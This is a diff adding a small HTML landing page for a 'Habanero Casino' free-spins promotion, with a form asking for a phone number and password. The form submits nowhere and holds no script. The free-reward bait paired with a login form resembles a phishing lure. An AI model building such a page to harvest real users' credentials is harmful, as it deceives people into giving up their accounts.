@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Habanero Casino: Free Spins</title>
+  <link rel="stylesheet" href="styles/main.css">
+</head>
+<body>
+  <div class="cover-bg">
+    <div class="overlay">
+      <div class="cover-content">
+        <img src="images/casino-logo.png" alt="Habanero Free Spins Casino" class="logo">
+        <h1>Claim Your Free Habanero Spins!</h1>
+        <p class="slogan">Log in & Get 100 Free Spins Instantly!</p>
+        <form class="login-form" action="#" method="post">
+          <input type="tel" name="phone" placeholder="Phone Number" required pattern="[0-9]{7,15}">
+          <input type="password" name="password" placeholder="Password" required>
+          <button type="submit">Claim Now</button>
+        </form>
+        <p class="info">No credit card needed &bull; New players only</p>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
